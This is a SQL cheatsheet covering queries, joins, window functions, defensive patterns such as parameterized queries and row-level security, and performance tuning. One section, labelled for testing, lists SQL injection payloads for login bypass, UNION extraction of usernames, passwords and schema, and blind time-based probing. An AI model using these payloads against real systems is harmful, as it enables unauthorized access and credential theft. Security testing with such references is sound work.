# FLLC SQL Cheatsheet

> Quick reference for SQL operations, security patterns, and forensic queries.

---

## Core Operations

```sql
-- SELECT with filtering, sorting, pagination
SELECT id, name, email FROM users
WHERE role = 'admin' AND created_at > '2026-01-01'
ORDER BY created_at DESC
LIMIT 25 OFFSET 0;

-- JOINs
SELECT u.username, o.total, p.name
FROM users u
INNER JOIN orders o ON u.id = o.user_id
LEFT JOIN products p ON o.product_id = p.id
WHERE o.total > 100;

-- Aggregation
SELECT category, COUNT(*) AS count, AVG(price) AS avg_price, SUM(price) AS total
FROM products
GROUP BY category
HAVING COUNT(*) > 5
ORDER BY total DESC;

-- Subqueries
SELECT * FROM users WHERE id IN (
    SELECT user_id FROM orders WHERE total > 500
);

-- Window Functions
SELECT name, price, category,
    RANK() OVER (PARTITION BY category ORDER BY price DESC) AS rank_in_category,
    LAG(price) OVER (ORDER BY price) AS prev_price
FROM products;

-- CTEs (Common Table Expressions)
WITH high_spenders AS (
    SELECT user_id, SUM(total) AS lifetime_spend
    FROM orders GROUP BY user_id HAVING SUM(total) > 1000
)
SELECT u.username, hs.lifetime_spend
FROM high_spenders hs JOIN users u ON hs.user_id = u.id;
```

## Security Patterns

```sql
-- ALWAYS use parameterized queries
-- Python: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
-- Java:   ps.setString(1, username);
-- Node:   db.query("SELECT * FROM users WHERE id = $1", [userId]);

-- Input validation at DB level
ALTER TABLE users ADD CONSTRAINT chk_email
    CHECK (email REGEXP '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$');

-- Row-level security (PostgreSQL)
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;
CREATE POLICY user_documents ON documents
    USING (owner_id = current_setting('app.current_user_id')::INT);
```

## Injection Payloads (for testing)

```sql
-- Authentication bypass
' OR '1'='1
' OR '1'='1' --
admin' --
' UNION SELECT NULL --

-- Data extraction
' UNION SELECT username, password, 3 FROM users --
' UNION SELECT table_name, column_name, 3 FROM information_schema.columns --

-- Blind injection
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') > 0 --
' AND IF(1=1, SLEEP(3), 0) --
```

## Performance

```sql
-- EXPLAIN query plan
EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 42;

-- Create covering index
CREATE INDEX idx_orders_user_date ON orders(user_id, order_date) INCLUDE (total);

-- Find slow queries (MySQL)
SELECT * FROM performance_schema.events_statements_summary_by_digest
ORDER BY SUM_TIMER_WAIT DESC LIMIT 10;
```

---

*FLLC 2026*
